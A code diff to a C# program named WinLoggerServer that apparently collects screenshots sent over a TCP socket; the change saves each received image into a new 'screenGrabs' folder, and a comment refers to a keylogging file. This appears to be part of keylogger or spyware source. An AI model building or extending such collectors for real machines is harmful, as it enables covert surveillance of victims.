@@ -29,7 +29,9 @@ public class WinLoggerServer {
 
         // Create a TCP/IP socket.  
         Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  
-
+		string curDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+		string foldDir = System.IO.Path.Combine(curDirectory, "screenGrabs");
+		System.IO.Directory.CreateDirectory(foldDir);
         // Bind the socket to the local endpoint and   
         // listen for incoming connections.  
         try {  
@@ -49,9 +51,9 @@ public class WinLoggerServer {
 				{
 					screenGrab = Image.FromStream(memStream);
 				}
-                // Append text to the keylogging file.
                 string append = "logFileLine" + index.ToString() + ".png";
-				string screenfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + append;
+                // Append text to the keylogging file.
+				string screenfp = System.IO.Path.Combine(foldDir, append);
 				index++;
 				screenGrab.Save(screenfp);
                 handler.Shutdown(SocketShutdown.Both);  
